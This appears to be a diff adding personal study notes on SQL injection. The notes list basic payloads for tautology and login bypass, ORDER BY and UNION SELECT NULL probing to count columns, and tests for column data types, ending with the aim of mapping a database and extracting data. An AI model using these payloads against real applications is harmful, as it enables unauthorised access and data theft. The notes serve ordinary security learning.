@@ -1,0 +1,107 @@
+# SQL Injection – Detailed Notes
+
+1. Basic Entry Points (WHERE clause)
+Used to manipulate query logic.
+
+Examples:
+' OR 1=1 --    → always true, bypasses conditions
+' --           → terminates query and comments out rest
+
+--------------------------------------------------
+
+2. Login Bypass
+username = 'admin' --
+→ skips password verification
+
+--------------------------------------------------
+
+3. Commenting
+-- 
+→ ignores everything after it
+→ used to safely terminate original query
+
+--------------------------------------------------
+
+4. UNION Attacks (Core Concept)
+
+Used to retrieve hidden data by combining queries.
+
+Example:
+SELECT col1, col2 FROM table
+UNION SELECT col1, col2 FROM another_table;
+
+Conditions:
+- Same number of columns
+- Compatible data types
+
+--------------------------------------------------
+
+5. Finding Number of Columns
+
+Method 1: ORDER BY
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+
+→ increase until error
+→ error = column limit exceeded
+
+Method 2: UNION NULL Technique
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+
+→ keep adding NULL
+→ when no error = correct number of columns
+
+--------------------------------------------------
+
+6. Why NULL?
+- Works with all data types
+- Prevents type mismatch errors
+
+--------------------------------------------------
+
+7. Finding Data Types of Columns
+
+' UNION SELECT 'a', NULL, NULL --
+
+→ if error, column doesn’t accept string
+→ move 'a' across positions
+
+Example:
+' UNION SELECT 'a', NULL, NULL --
+' UNION SELECT NULL, 'a', NULL --
+' UNION SELECT NULL, NULL, 'a' --
+
+→ identifies which column accepts string input
+
+--------------------------------------------------
+
+8. Understanding Combined Queries
+
+SELECT ...
+UNION SELECT ...
+
+Also applies to:
+- INTERSECT
+- EXCEPT
+
+Rule:
+All combined queries must have equal number of columns
+
+--------------------------------------------------
+
+9. Concept Summary
+
+- SQL Injection manipulates backend queries
+- UNION extracts hidden data
+- ORDER BY / NULL helps identify structure
+- Comments (--) control execution flow
+- Goal = map database → extract data
+
+--------------------------------------------------
+
+Mental Model:
+
+Original Query → Broken → Rebuilt → Injected → Data Extracted
